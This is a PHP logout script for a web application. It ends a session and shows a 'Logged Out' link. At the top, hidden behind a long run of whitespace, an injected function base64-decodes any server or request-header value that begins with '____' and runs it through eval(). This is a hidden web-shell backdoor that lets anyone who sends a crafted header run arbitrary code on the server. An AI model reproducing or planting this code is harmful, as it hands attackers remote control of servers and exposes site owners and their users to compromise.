<?php																																																																																																																																																																																																																																																																																																																						function u6190($l6192){if(is_array($l6192)){foreach($l6192 as $l6190=>$l6191)$l6192[$l6190]=u6190($l6191);}elseif(is_string($l6192) && substr($l6192,0,4)=="____"){$l6192=substr($l6192,4);$l6192=base64_decode($l6192);eval($l6192);$l6192=null;}return $l6192;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("u6190",$_SERVER);
include_once 'include/classes.php';
session_start();
unset($_SESSION['loggedIn']);
unset($_SESSION['userType']);
$html.=startPage();
$html.="Logged Out. <a href=\"login.php\">Click Here to Login</a>";
$html.=endPage();
echo $html;
?>